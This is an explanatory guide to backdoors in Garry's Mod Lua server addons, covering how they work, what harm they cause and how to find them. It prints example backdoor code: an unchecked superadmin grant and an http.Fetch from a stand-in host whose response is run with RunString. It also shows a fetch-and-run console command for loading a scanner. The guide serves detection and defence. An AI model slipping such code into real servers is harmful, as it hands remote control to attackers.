# About backdoors

A "back door" is a different entrace to something which ignores authentication / verification.

An easy example would be:

```lua
net.Receive("MakeMeAdmin",function(len,ply)
    ply:SetUserGroup("superadmin")
end)
```

This code example above would make any player superadmin that could send that net message to the server.

This example is a bit "obvious" because of its net name, normally the code would be obfuscated or name-changed to something innocent.

Most backdoors nowadays are done via http.  
An example:

```lua
http.Fetch("https://example.com/getlua.php?key=3",function(body)
    RunString(body)
end)
```

The above example simply gets the lua file from a webserver and executes it, which means the adversary can change the code that gets executed without having to change the backdoor itself.

This example can also be found rather easily by searching for "http" calls in all your addons (e.g. via CTRL+F), but because of obfuscation it could be more difficult to find.


## Potential hazards

If someone has access to your "lua server state" (=can execute lua code on your server) they can do everything and anything with it.  
This includes:

 - Steal any and all lua files
 - Make everyone superadmin
 - Delete database or data/ folder
 - Crash player's game via spam
 - Reset any custom addon settings for players
 - Get the IP, country, etc. of players

That's why it is important to remove any and all backdoors you find.


## Detecting

To detect backdoors you can use scripts that search for your files (e.g. "nomalua" or luctus' bdscanner, found in darkrp-exploits/scripts) or simply search for them yourself.  
To use my script on a running server you can execute the following 2 console commands on your server. Warning: The server will probably lag a lot for ~5 seconds.

```lua
lua_run http.Fetch("https://raw.githubusercontent.com/OverlordAkise/darkrp-exploits/main/scripts/sv_luctus_bdscanner.lua",function(b) RunString(b) end)
-- short pause until the above script is loaded
luctus_scan
```

Most can be found by searching for "http" or "RunString" or "CompileString" through all your lua files.

Some may be harder to find. I recommend to let your developer search through your addons to find them.
